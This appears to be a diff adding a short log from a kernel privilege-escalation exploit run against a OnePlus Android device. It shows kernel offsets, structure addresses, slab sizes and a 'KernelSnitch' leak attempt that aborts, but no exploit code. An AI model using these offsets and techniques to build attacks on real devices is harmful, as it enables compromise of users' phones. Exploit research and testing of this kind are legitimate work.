@@ -1,0 +1,9 @@
+[33m[*] [0mkernel: 4.14.186-g844fd19c6
+[32m[+] [0moffsets matched: 4.14.186-g844fd19c6
+[32m[+] [0mstartup context pid=28568 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=28568 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[32m[+] [0mbuild config pid=28568 label=ghostlock_oneplus slide=pselect main=pselect
+[32m[+] [0mp0 profile pid=28568 phys_offset=0000000040000000 kernel_phys_load=0000000040080000 delta=0000000000080000 slide_logger=ffffff8001cd1500 bootid_data=ffffff8002122670 init_task=ffffff8001cdbec0 root_tg=ffffff8001ccdb78 sysctl_bootid=ffffff8002122670
+[33m[*] [0m[T+0ms] exploit start
+[33m[*] [0mGK30: mm_struct_sz=0x500 (offset table=0x500) objs_per_slab=25
+[31m[!] [0mKernelSnitch leak bogus: mm_struct=0xffffff8317241e00 base=0xffffff8317240000 phys_off=0x317240000 limit=0x200000000 — aborting this attempt
